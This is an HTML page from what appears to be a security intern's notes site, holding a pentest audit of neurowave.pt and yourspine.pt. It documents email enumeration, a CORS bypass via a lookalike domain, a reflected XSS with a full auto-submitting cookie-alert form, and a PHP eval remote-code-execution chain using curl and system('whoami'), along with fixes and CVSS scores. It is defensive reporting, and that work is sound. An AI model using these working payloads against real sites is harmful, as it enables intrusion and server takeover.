<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="shortcut icon" href="../../img/favicon.ico" />
    <title>NEUROWAVE, LDA - Internship Ramblings</title>
    <link rel="stylesheet" href="../../css/theme.css" />
    <link rel="stylesheet" href="../../css/theme_extra.css" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
    
      <script>
        // Current page data
        var mkdocs_page_name = "NEUROWAVE, LDA";
        var mkdocs_page_input_path = "audits/neurowave.md";
        var mkdocs_page_url = null;
      </script>
    
    <script src="../../js/jquery-3.6.0.min.js" defer></script>
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.min.js"></script>
    <![endif]-->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
      <script>hljs.initHighlightingOnLoad();</script> 
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
    <div class="wy-side-scroll">
      <div class="wy-side-nav-search">
          <a href="../.." class="icon icon-home"> Internship Ramblings
        </a><div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <ul>
                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
                </li>
              </ul>
              <p class="caption"><span class="caption-text">OWASP</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../OWASP/api/">Api</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">SAML</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../SAML/saml_notes/">SAML</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Audits</span></p>
              <ul class="current">
                  <li class="toctree-l1"><a class="reference internal" href="../PoC/">Coverflex</a>
                  </li>
                  <li class="toctree-l1 current"><a class="reference internal current" href="./">NEUROWAVE, LDA</a>
    <ul class="current">
    <li class="toctree-l2"><a class="reference internal" href="#email-enumeration-neurowavept-yourspinept">Email enumeration (neurowave.pt, yourspine.pt)</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#description">Description</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#instructions">Instructions</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#recomendations">Recomendations</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#score">Score</a>
    </li>
        </ul>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#cors-misconfiguration-neurowave-yourspinept">CORS misconfiguration (neurowave, yourspine.pt)</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#description_1">Description</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#instructions_1">Instructions</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#recomendations_1">Recomendations</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#score_1">Score:</a>
    </li>
        </ul>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#poc-for-xss-at-httpswwwyourspineptptarea-reservadarecuperar-password">PoC for XSS at https://www.yourspine.pt/pt/area-reservada/recuperar-password</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#description_2">Description</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#instructions_2">Instructions</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#reccomendations">Reccomendations</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#score_2">Score</a>
    </li>
        </ul>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#poc-for-rce-via-php-eval-at-httpswwwyourspinept">PoC for RCE via PHP eval at https://www.yourspine.pt/*</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#description_3">Description</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#instructions_3">Instructions</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#recomendations_2">Recomendations</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#score_3">Score</a>
    </li>
        </ul>
    </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Ctfs</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="#">Capital ctf</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/capital-ctf/">Index</a>
                </li>
    </ul>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Dvga</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/dvga/dvga/">Dvga</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Dvwss</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../dvwss/notes/">Notes</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Goatlin</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../goatlin/notes/">Goatlin Notes</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Notes</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../notes/api_types/">Api types</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../notes/http2/">Http2</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../notes/nosqli/">NoSQL</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../notes/sql/">SQL - Structured Query Language</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Portswigger</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../portswigger/labs/">PortSwigger labs</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Quiz</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../quiz/SecurityChampion/">QUIZ</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Research</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../research/angular_notes/">Angular</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../research/dangling%20markup/">Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Subdomain takeover</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../../research/subdomain-takeover/">Index</a>
                </li>
                <li class="toctree-l2"><a class="reference internal" href="#">Findings</a>
    <ul>
                <li class="toctree-l3"><a class="reference internal" href="../../research/subdomain-takeover/findings/security-advisory/">Security Advisory</a>
                </li>
    </ul>
                </li>
                <li class="toctree-l2"><a class="reference internal" href="#">Src</a>
    <ul>
                <li class="toctree-l3"><a class="reference internal" href="#">Commands</a>
    <ul>
                <li class="toctree-l4"><a class="reference internal" href="../../research/subdomain-takeover/src/commands/commands/">Commands</a>
                </li>
    </ul>
                </li>
                <li class="toctree-l3"><a class="reference internal" href="#">Script</a>
    <ul>
                <li class="toctree-l4"><a class="reference internal" href="../../research/subdomain-takeover/src/script/">Index</a>
                </li>
    </ul>
                </li>
    </ul>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Techniques</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/interesting/">Techniques created by me (or not) uncommon in the wild</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/methodology/">A methodological checklist to logically deduce the steps needed to pentest a web app.</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/triggers/">Errors based/behaviour inferer</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Tools</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../tools/notes/">Notes</a>
                  </li>
              </ul>
      </div>
    </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../..">Internship Ramblings</a>
        
      </nav>
      <div class="wy-nav-content">
        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
          <li>Audits &raquo;</li>
      <li>NEUROWAVE, LDA</li>
    <li class="wy-breadcrumbs-aside">
    </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div class="section" itemprop="articleBody">
              
                <h1 id="neurowave-lda">NEUROWAVE, LDA</h1>
<h2 id="email-enumeration-neurowavept-yourspinept">Email enumeration (neurowave.pt, yourspine.pt)</h2>
<h3 id="description">Description</h3>
<p>When supplying an email to reset its password, the application bluntly spews the email does not exist if it does not. This allows an attacker to enumerate, albeit slowly due to the captcha, emails existing in the database.</p>
<h3 id="instructions">Instructions</h3>
<p>Go to <code>https://www.neurowave.pt/pt/area-reservada/recuperar-password</code> and input an email which does not exist in the database. Complete the captcha and reset your password.</p>
<p>The application returns: <code>O endereço de email não se encontra associado a nenhuma conta</code></p>
<h3 id="recomendations">Recomendations</h3>
<p>Send another type of message, such as: "If the email exists we will send you the reset password link."</p>
<h3 id="score">Score</h3>
<p>Medium</p>
<h2 id="cors-misconfiguration-neurowave-yourspinept">CORS misconfiguration (neurowave, yourspine.pt)</h2>
<h3 id="description_1">Description</h3>
<p>An attacker can forge an origin header which includes the <code>neurowave.pt</code> or <code>yourspine.pt</code> and it will bypass the CORS post check</p>
<h3 id="instructions_1">Instructions</h3>
<p>Send a curl request like the following: <code>curl -H "Origin: https://www.example.com" -X POST https://www.neurowave.pt/</code>. Notice the request fails because of an invalid Origin header.</p>
<p>Send the next request: <code>curl -H "Origin: https://neurowave.pt.example.com" -X POST https://www.neurowave.pt/</code>. Notice the request does not fail.</p>
<h3 id="recomendations_1">Recomendations</h3>
<p>Validate that the domains allowed are present in the whitelist of allowed domains.</p>
<h3 id="score_1">Score:</h3>
<p>Informative</p>
<p>XSS AT:</p>
<p><code>https://www.yourspine.pt/pt/area-reservada/recuperar-password</code></p>
<h2 id="poc-for-xss-at-httpswwwyourspineptptarea-reservadarecuperar-password">PoC for XSS at https://www.yourspine.pt/pt/area-reservada/recuperar-password</h2>
<h3 id="description_2">Description</h3>
<p>Input is unproperly sanitized in the context of html, so we can inject arbitrary js via the POST request. Cors prevents the user from sending the payload through any type of domain. It can be bypassed by simply creating a domain with name: <code>yourspine.pt.char49.com</code>.</p>
<h3 id="instructions_2">Instructions</h3>
<p>The following file will auto-submit a form with an xss payload.</p>
<pre><code>
&lt;html&gt;
  &lt;body&gt;
    &lt;form action=&quot;https://www.yourspine.pt/pt/area-reservada/recuperar-password&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;recuperarEmail&quot; value=&quot;francisco&amp;#46;santos&amp;#64;char49&amp;#46;com&amp;gt;&amp;apos;&amp;quot;&amp;#47;&amp;gt;&amp;lt;script&amp;gt;alert&amp;#40;document&amp;#46;cookie&amp;#41;&amp;#59;&amp;lt;&amp;#47;script&amp;gt;&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;recuperarPassword&quot; value=&quot;Recuperar&amp;#32;password&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
  &lt;script&gt;
    document.forms[0].submit();
  &lt;/script&gt;
&lt;/html&gt;

</code></pre>
<p>It is served on this link: <code>https://yourspine.pt.char49.com/poc.html</code>. Click it and notice the cors request succeeds and the payload is executed.</p>
<h3 id="reccomendations">Reccomendations</h3>
<p>Sanitize user input and whitelist <strong>literally</strong> the domains you want communication to succeed from cors.</p>
<h3 id="score_2">Score</h3>
<p><strong>6.3</strong></p>
<p><code>https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L</code></p>
<h2 id="poc-for-rce-via-php-eval-at-httpswwwyourspinept">PoC for RCE via PHP eval at https://www.yourspine.pt/*</h2>
<h3 id="description_3">Description</h3>
<p>This vulnerability arises because user input is directly concatenated into an eval call which is used for the server routing. An attacker can simply escape from that context and inject the arbitrary php code. PHP has the ability to execute system commands, with, for example, the system function.</p>
<h3 id="instructions_3">Instructions</h3>
<p>The first step is to inject a quote: <code>curl https://www.yourspine.pt/pt/regioes-anatomicas/toracic'</code>. Notice the applications http response returns 500.</p>
<p>To confirm we are inside some type of evaluation context, insert a backslash before the quote: <code>curl https://www.yourspine.pt/pt/regioes-anatomicas/toracic\'</code>. The app no longer returns 500.</p>
<p>To confirm the eval, we concatenate <code>toracic</code> with <code>a</code> and it should return the same result as if it wasn't concatenated: <code>curl https://www.yourspine.pt/pt/regioes-anatomicas/toracic'.'a</code></p>
<p>We now know for sure this is an eval call, so we attempt to inject a system command: <code>curl https://www.yourspine.pt/pt/regioes-anatomicas/toracic'.system("whoami").'a</code></p>
<p>It outputs the current user therefore RCE suceeded and this technique also works for: <code>https://www.yourspine.pt/*</code></p>
<h3 id="recomendations_2">Recomendations</h3>
<p>Do not directly concatenate user input into an eval call, and if it really is the only solution, create a whielist of values a user can input.</p>
<h3 id="score_3">Score</h3>
<p><strong>10</strong></p>
<p><code>https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code></p>
              
            </div>
          </div><footer>
    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
        <a href="../PoC/" class="btn btn-neutral float-left" title="Coverflex"><span class="icon icon-circle-arrow-left"></span> Previous</a>
        <a href="../../ctfs/capital-ctf/" class="btn btn-neutral float-right" title="Index">Next <span class="icon icon-circle-arrow-right"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
  </div>

  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
          
        </div>
      </div>

    </section>

  </div>

  <div class="rst-versions" role="note" aria-label="Versions">
  <span class="rst-current-version" data-toggle="rst-current-version">
    
    
      <span><a href="../PoC/" style="color: #fcfcfc">&laquo; Previous</a></span>
    
    
      <span><a href="../../ctfs/capital-ctf/" style="color: #fcfcfc">Next &raquo;</a></span>
    
  </span>
</div>
    <script>var base_url = '../..';</script>
    <script src="../../js/theme_extra.js" defer></script>
    <script src="../../js/theme.js" defer></script>
      <script src="../../search/main.js" defer></script>
    <script defer>
        window.onload = function () {
            SphinxRtdTheme.Navigation.enable(true);
        };
    </script>

</body>
</html>
